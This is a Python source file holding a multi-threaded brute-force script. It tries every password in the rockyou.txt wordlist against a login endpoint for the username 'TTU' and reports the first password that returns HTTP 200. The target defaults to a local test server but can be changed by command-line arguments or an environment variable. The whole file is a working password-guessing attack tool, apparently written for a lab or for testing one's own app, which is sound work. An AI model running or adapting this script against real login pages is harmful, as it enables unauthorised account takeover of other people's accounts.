import argparse
import os
import requests
import time
import threading
from concurrent.futures import ThreadPoolExecutor

URL = os.getenv("BRUTE_FORCE_URL", "http://127.0.0.1:5000/login")
WORDLIST_PATH = "rockyou.txt"
THREADS = 10  # Number of simultaneous requests
FOUND = False
FOUND_PASSWORD = None

# Use a session for connection pooling
session = requests.Session()
lock = threading.Lock()

def attempt_password(password):
    global FOUND, FOUND_PASSWORD
    with lock:
        if FOUND:
            return

    payload = {"username": "TTU", "password": password}
    
    try:
        response = session.post(URL, json=payload, timeout=5)
        if response.status_code == 200:
            with lock:
                FOUND = True
                FOUND_PASSWORD = password
            print(f"\n[+] SUCCESS! Password found: {password}")
    except Exception:
        pass

def run_test(target_url=None):
    global URL, FOUND
    if target_url:
        URL = target_url
    global FOUND
    print(f"[*] Starting multi-threaded attack with {THREADS} threads...")
    start_time = time.time()

    try:
        with open(WORDLIST_PATH, 'r', encoding='latin-1') as file:
            # Using a ThreadPoolExecutor to manage our worker threads
            with ThreadPoolExecutor(max_workers=THREADS) as executor:
                for line in file:
                    if FOUND:
                        break
                    
                    password = line.strip()
                    executor.submit(attempt_password, password)

    except FileNotFoundError:
        print("[-] Wordlist not found.")
        return

    if not FOUND:
        print("[-] Password not found.")
    
    end_time = time.time()
    print(f"[*] Finished in {end_time - start_time:.2f} seconds.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Brute force an HTTP /login endpoint.")
    parser.add_argument("--host", default="127.0.0.1", help="Target host")
    parser.add_argument("--port", default="5000", help="Target port")
    parser.add_argument("--path", default="/login", help="Login endpoint path")
    args = parser.parse_args()
    target_url = f"http://{args.host}:{args.port}{args.path}"
    run_test(target_url)